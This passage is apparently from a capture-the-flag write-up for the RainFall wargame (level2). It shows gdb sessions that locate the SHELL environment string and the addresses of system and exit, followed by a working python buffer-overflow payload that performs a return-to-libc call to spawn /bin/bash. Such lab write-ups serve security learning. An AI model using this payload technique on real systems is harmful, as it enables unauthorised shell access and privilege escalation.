## Find SHELL env var

```sh
(gdb) x/s *((char **)environ)
0xbffff915:      "SHELL=/bin/bash"
(gdb) x/s *((char **)environ) + 6
0xbffff91b:      "/bin/bash"
```

We saw our offset to the return address was 80 so EBP is 80 - 4 (the size of EBP) = 76

## Return to libc

We will use the [return-to-libc method](https://css.csail.mit.edu/6.858/2019/readings/return-to-libc.pdf) so we are going to set the address of system in EBP, and his parameter after the return address area (the dedcated space for parameters)

```sh
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

```sh
level2@RainFall:~$ python -c "print('H' * 80 + '\x60\xb0\xe6\xb7' + 'A' * 4 + '\x1b\xf9\xff\xbf')" | ./level2
(0xb7e6b060)
```

```sh
(gdb) p exit
$1 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```